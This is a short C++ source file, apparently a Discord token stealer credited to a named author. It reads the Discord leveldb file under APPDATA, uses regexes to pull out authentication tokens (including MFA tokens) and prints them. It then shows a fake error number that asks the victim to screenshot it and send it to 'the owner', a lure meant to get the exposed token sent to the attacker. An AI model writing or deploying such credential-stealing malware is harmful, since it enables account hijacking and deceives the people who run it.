#include <iostream>
#include <fstream>
#include <regex>

#include <stdlib.h>
#include <stdio.h>

using namespace std;
    /*                                                         -|
     | Made by xanthe1337                                      -|
     | GitHub: https://github.com/xanthe1337                   -|
     | Discord: @xevy#1337                                     -|
     | - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|
     | Credits: Thanks iLinked1337 for the regexes <3 no homo  -|
   */ 
   FILE* fp;
   char* fpbuf;
   int errThrower;
   size_t sz = 0;   
   errno_t Environment = _dupenv_s(&fpbuf, &sz, "APPDATA");
   string AppData = fpbuf;
   string levelDB = AppData + "/Discord/Local Storage/leveldb/000005.ldb";
   string Regex = R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})";
   string otherRegex = R"(mfa\.[\w-]{84})";
   string String = "[oken";
   string Content;

string readAllText(const char* filename) { // Shortcut to read every single char in a file
  fopen_s(&fp, filename, "rb");
  if (fp) {
     fseek(fp, 0, SEEK_END);
     Content.resize(ftell(fp));
     rewind(fp);
     fread(&Content[0], 1, Content.size(), fp);
     fclose(fp);
  }
  return(Content);
}

int main() { // Main function, runs everything using outside functions and variables 
    smatch smatch;
    try {
        string data = readAllText(levelDB.c_str());
        if (data.find(String, 0) != string::npos) {
           regex x(Regex);
           if (regex_search(data, smatch, x) == true) {
               cout << smatch.str() << '\n';
           } else {
               regex y(otherRegex);
               if (regex_search(data, smatch, y) == true) {
                  cout << smatch.str() << '\n';
               } else {
                  cout << "[REGEX] Not Found" << '\n';
               }
           }
        } else {
            return 0;
        }
    } catch (exception) {
        return 0;
    }
    errThrower = rand() % 550 + 950;
    cout << "[" << errThrower << "] - Some error happened! screenshot this number and send it to the owner!";
    system("pause >NUL");
}
